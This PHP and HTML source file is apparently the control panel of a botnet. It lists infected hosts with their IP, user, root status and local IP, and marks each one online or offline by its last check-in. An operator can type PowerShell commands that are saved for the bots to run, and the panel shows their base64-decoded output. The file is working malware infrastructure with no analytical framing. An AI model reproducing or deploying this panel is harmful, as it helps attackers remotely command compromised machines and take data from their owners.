<?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // If The Button Has Been Pressed
    if(isset($_POST['submit'])) {
        if(isset($_POST['code'])) {
            // Add The Edited Code To The File
            file_put_contents("script.txt", $_POST['code']);
        }
    }
} $fileCode = file_get_contents("script.txt");?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <link rel="stylesheet" href="css/main.css?">
    <script src="js/script.js"></script>
    <!-- ################ Import Dependencies ################ -->
    <!-- Import highlight.js -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/styles/default.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/highlight.min.js"></script>
    <!-- Import PowerShell -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/languages/powershell.min.js"></script>
    <!-- Import Code-Input From WebCoder49's CDN -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/WebCoder49/code-input@1.0/code-input.css">
        <script src="https://cdn.jsdelivr.net/gh/WebCoder49/code-input@1.0/code-input.js"></script>
    <!-- Configure Code-Input -->
        <script>codeInput.registerTemplate("syntax-highlighted", codeInput.templates.hljs(hljs));</script>
    <!-- Import Open Sans From Google's CDN -->
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
    <!-- ##################################################### -->
    </head>
<body>
    <table cellspacing="0" cellpadding="0" id="table">
        <tr><th class="status"> </th><th>IP</th><th>USER</th><th>ROOT</th><th>LOCAL_IP</th></tr>
        <tbody><?php 
            // Open The Hosts File As An Array
            $array = explode("\n", file_get_contents('data/data.txt'));
            for($i=0; $i<=count(file('data/data.txt'))-1; $i++) {
                $line = $array[$i]; $data = explode(" ", $line);
                echo '<tr>';
                // Change The Time Zone To The Hosts Time
                date_default_timezone_set('Europe/Bucharest');
                $date = date('YmdHis', time());
                if($date-$data[5]<=100) { // If Less Than 100 Seconds Have Passed
                    echo "<td><span id='online'></span></td>"; // The Bot Is Online
                }
                else echo "<td><span id='offline'></span></td>"; // The Bot Is Offline
                // Increment The Value 4 If More Data String Are Needed
                for($j=1; $j<=4; $j++) {
                    $str = $data[$j];
                    echo '<td>' . $str . '</td>';
                }
            }
            echo '</tr>';
        ?></tbody>
    </table>
    <form id="form" method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
        <div id="wrapper">
            <code-input name="code" id="codeBlock" lang="powershell" placeholder="Enter Your Command!" value="<?php echo $fileCode;?>" onchange="check(this.value);"></code-input>
            <span class="saved" id="saveStatus"></span>
        </div>
        <input type="submit" name="submit" value="Go" id="submit">
        <script>codeInput.registerTemplate("syntax-highlighted", codeInput.templates.hljs(hljs));</script>
    </form>
    <div class="area" id="area" contenteditable spellcheck="false"><?php 
        $responseData = explode("\n", file_get_contents("data/output.txt"));
        for($i=0; $i<=count($responseData)-1; $i++) {
            // Remove White Spaces
            $responseData[$i] = preg_replace(array('/\s{2,}/', '/[\t\n]/'), ' ', $responseData[$i]);
            if($responseData[$i]!="" && $responseData[$i]!=" ") {
                $lineData = explode(" ", $responseData[$i]);
                // Swap Date Format To Something Easier To Read
                $dateCurrent = date('YmdHis', time()); // Get Current Date
                $newDate = date("d.m.Y H:i", strtotime($lineData[2]));
                $valueDecoded = base64_decode($lineData[3]);
                $response = '[RESPONSE]: From ' . $lineData[0] . ' / ' . $lineData[1] . ' at ' . $newDate . ':';
                if($dateCurrent-$lineData[2]<=120) { // If Less Than 120 Seconds Have Passed
                    echo "<span class='response-header'><pre><span class='dot'>{$i}</span>{$response}</pre></span>";
                    echo "<pre class='recent'>{$valueDecoded}</pre>";
                    // The Response Is Recent
                } else {
                    echo "<span class='response-header'><pre><span class='dot'>{$i}</span>{$response}</pre></span>";
                    echo "<pre>{$valueDecoded}</pre>";
                }
            }
        }?>
    </div>
</body>
<code-input value="<?php echo $fileCode;?>" style="display: none"></code-input>
</html>
